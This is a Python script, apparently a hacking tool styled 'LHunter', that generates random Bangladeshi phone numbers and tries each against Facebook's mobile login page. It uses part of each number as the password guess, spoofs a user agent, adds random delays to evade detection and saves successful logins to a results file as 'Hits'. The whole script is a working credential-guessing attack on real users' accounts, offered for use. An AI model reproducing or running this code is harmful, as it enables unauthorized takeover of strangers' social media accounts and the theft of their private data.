
# Hnflw #
# gan' gan' #

import random
import time
import os
import mechanicalsoup
import datetime

check_url = "https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fhome.php&refsrc=https%3A%2F%2Fm.facebook.com%2Fhome.php&_rdr"
home = "https://m.facebook.com/home.php"

user_agents = [
"Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.1805 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-T555 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; Lenovo-A6020l36 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",

"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1"
]

banner = """
    __    __  __            __           
   / /   / / / /_  ______  / /____  _____
  / /   / /_/ / / / / __ \/ __/ _ \/ ___/
 / /___/ __  / /_/ / / / / /_/  __/ /    
/_____/_/ /_/\__,_/_/ /_/\__/\___/_/     
                                         
       by Hunter Follow
      
      
"""
def c():
    os.system("cls||clear")
c()

def intro():
    for line in banner.splitlines():
        print(line)
        time.sleep(0.07)
intro()

head_nums = [
"14",
"17",
"18",
"19",
"16"
]

help = """

----------
Help menu
----------
help            show help
show            show commands
clear           clear screen
exit            exit the tool

"""
cmds = """

---------
Commands
---------
crack       crack profile-locked accounts
gen         generate numbers

"""
commands = ["help", "exit", "show", "crack", "check", "clear", "gen"]
while True:
    cmd = str(input("lhf > "))
    if cmd == "":
    	None
    if cmd not in commands and cmd != "":
        print('[!] command "' + str(cmd) + '"', 'not found\ntype "help" for help-menu')

    else:
        if cmd == "help":
            print(help)
        if cmd == "exit":
            print("\nsee ya :) !")
            exit()
        if cmd == "show":
            print(cmds)
        if cmd == "crack":
            amount = int(input("\nNumbers Amount : "))
            print("Generating", amount, "numbers... Please wait")
            numbers = []
            passwords = []
            hit = []
            unknown = []
            false = []
            z = 0
            s = 0
            for i in range(amount):
                s = s + 1
                part2_num = random.randint(10000000, 100000000)
                lnum = list(str(part2_num))
                snum = []
                snum.append(lnum[0])
                snum.append(lnum[1])

                lnum.remove(lnum[0])
                lnum.remove(lnum[1])

                x = "".join(snum)
                l = "".join(lnum)

                number = f"+880 {random.choice(head_nums)}{x}-{l}"
                password = l
                numbers.append(number)
                passwords.append(password)
                
            print("Numbers generated ✅")
            time.sleep(1)
            print("\nStarting crack...")
            file = open("results.txt", "w")
            for u, p in zip(numbers, passwords):
                date = datetime.datetime.now()
                timee = str(date.hour) + ":" + str(date.minute)
                z = z + 1
                delay = random.randint(3, 10)
                browser = mechanicalsoup.StatefulBrowser(
                    soup_config={'features': 'lxml'},
                    raise_on_404=True,
                    user_agent=user_agents[4]
                )
                resp = browser.open("https://m.facebook.com/login.php")

                time.sleep(0.5)
                browser.select_form(nr=0)
                browser["email"] = u
                browser["pass"] = p
                resp = browser.submit_selected()
                time.sleep(1)
                browser.open(home)
                time.sleep(1)
                if str(browser.get_url()) == check_url:
                    false.append("1")
                    print("\n" + str(z) + "-", u + ":" + p, "❌", "Tested at :", timee)
                if str(browser.get_url()) == home:
                    file.write(u + ":" + p + " (Hit)\n")
                    hit.append("1")
                    print("\n" + str(z) + "-", u + ":" + p, "✅", "Tested at :", timee, "\nNumber was wrritten to results.txt")
                if str(browser.get_url()) != check_url and str(browser.get_url()) != home:
                    file.write(u + ":" + p + " (Unknown)")
                    unknown.append("1")
                    print("\n" + str(z) + "-", u + ":" + p, "Unknown ? \nurl =", browser.get_url(), "\nNumber was wrritten to results.txt")
                print("delay :", delay)
                if z == len(numbers):
                    file.close()
                    print("\n[!] Finished Cracking\n")
                    print(f"Results : [{len(hit)}] Hits, [{len(unknown)}] Unknown, [{len(false)}] False\n")
                    break
                time.sleep(delay)
            
            
            
            
            
            
        if cmd == "gen":
            amount = int(input("\nNumbers Amount : "))
            print("Generating", amount, "numbers... Please wait")
            numbers = []
            s = 0
            for i in range(amount):
                s = s + 1
                part2_num = random.randint(10000000, 100000000)
                lnum = list(str(part2_num))
                snum = []
                snum.append(lnum[0])
                snum.append(lnum[1])

                lnum.remove(lnum[0])
                lnum.remove(lnum[1])

                x = "".join(snum)
                l = "".join(lnum)

                number = f"+880 {random.choice(head_nums)}{x}-{l}"
                numbers.append(number)
            print("Numbers generated ✅")
            fname = str(input("\nFile name : "))
            print("\nWriting numbers to :", fname + ".txt", end="\r")
            file = open(fname + ".txt", "w")
            for num in numbers:
                file.write(str(num) + "\n")
            print("Numbers wrriten to :", fname + ".txt", "successfully ✅")
            
            
        if cmd == "check":
        	path = str(input("\nPath to combo : "))
        	file = open(path, "r").readlines()
        	for line in file:
        		print(line)
        		time.sleep(0.005)
        if cmd == "clear":
        	os.system("cls||clear")
        
        
